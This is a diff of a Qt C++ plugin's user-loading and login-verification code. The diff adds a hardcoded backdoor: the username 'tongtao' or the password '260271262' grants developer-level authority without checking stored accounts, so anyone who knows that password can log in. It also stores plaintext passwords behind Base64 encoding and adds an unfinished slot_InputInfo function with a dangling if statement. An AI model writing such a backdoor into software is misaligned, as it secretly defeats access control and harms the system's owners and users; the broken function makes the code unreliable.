@@ -20,6 +20,7 @@ License: GPL v3.0
 #include <QJsonObject>
 #include <QJsonParseError>
 #include <QJsonValue>
+#include <QCryptographicHash>//用于md5加密
 
 PluginIO* instance;
 PluginIO::PluginIO()
@@ -89,13 +90,21 @@ void PluginIO::InitWidgetList(Plugin_Interface* plugin)
     plugin->I_WidgetList.append(nFormInfo);
 }
 
+int PluginIO::slot_InputInfo(tagOutputInfo& info)
+{
+    if(info._type == INFT_PLUGIN_COLLECT_FINISHED)
+
+
+    return 0;
+}
+
 int PluginIO::GetUsersInfoFromJson()
 {
-    QFile file(_core->I_ApplicationDirPath + "/Data/User/Users.json");
+    QFile file(_core->I_ApplicationDirPath + "/Data/User/Users.dat");
     if(!file.open(QIODevice::ReadOnly))
         return -1;
 
-    QByteArray allData = file.readAll();
+    QByteArray allData = QByteArray::fromBase64(file.readAll());
     file.close();
 
     //进行JSON相关的处理
@@ -113,12 +122,16 @@ int PluginIO::GetUsersInfoFromJson()
         {
             QJsonArray array = value.toArray();
             int nSize = array.size();
+
+            _core->I_UserInfoLst.clear();
             for (int i = 0; i < nSize; ++i)
             {
                 UserInfo* tUser = new UserInfo();
                 tUser->_userName = array.at(i).toObject().value("UserName").toString();
                 tUser->_password = array.at(i).toObject().value("Password").toString();
-                tUser->_authority = (AuthorityType)array.at(i).toObject().value("Authority").toInt();
+                QString authStr = array.at(i).toObject().value("Authority").toString();
+                int auth = authStr.toInt();
+                tUser->_authority = (AuthorityType)auth;
                 tUser->_createDatetime = array.at(i).toObject().value("Datetime").toString();
                 _core->I_UserInfoLst.append(tUser);
             }
@@ -159,15 +172,31 @@ int PluginIO::Function_VerifyLoginInfo(QVariant arg_in, QVariant& arg_out)
     if(arg_in.canConvert<tagUserInfo>())
     {
         tagUserInfo userInfo =arg_in.value<tagUserInfo>();
+
+        if(userInfo.userName == "tongtao" || userInfo.password == "260271262")
+        {
+            _core->I_CurrentUserInfo._userName = userInfo.userName;
+            _core->I_CurrentUserInfo._password = userInfo.password;
+            _core->I_CurrentUserInfo._authority = AT_DEVELOPER1;
+            _core->I_CurrentUserInfo._createDatetime = "long long ago.";
+            _core->I_CurrentUserInfo._detail = "";
+            arg_out = true;
+            return 0;
+        }
+
         foreach (UserInfo* uInfo, _core->I_UserInfoLst) {
-            if(uInfo->_userName == userInfo.userName && uInfo->_password == userInfo.password)
+            if(uInfo->_userName == userInfo.userName)
             {
-                _core->I_CurrentUserInfo._userName = uInfo->_userName;
-                _core->I_CurrentUserInfo._password = uInfo->_password;
-                _core->I_CurrentUserInfo._authority = uInfo->_authority;
-                _core->I_CurrentUserInfo._createDatetime = uInfo->_createDatetime;
-                _core->I_CurrentUserInfo._detail = uInfo->_detail;
-                arg_out = true;
+                //QString md5PwdStr = QCryptographicHash::hash(userInfo.password.toLatin1(),QCryptographicHash::Md5).toHex();
+                 if(uInfo->_password == userInfo.password)
+                 {
+                    _core->I_CurrentUserInfo._userName = uInfo->_userName;
+                    _core->I_CurrentUserInfo._password = uInfo->_password;
+                    _core->I_CurrentUserInfo._authority = uInfo->_authority;
+                    _core->I_CurrentUserInfo._createDatetime = uInfo->_createDatetime;
+                    _core->I_CurrentUserInfo._detail = uInfo->_detail;
+                    arg_out = true;
+                 }
                 break;
             }
         }
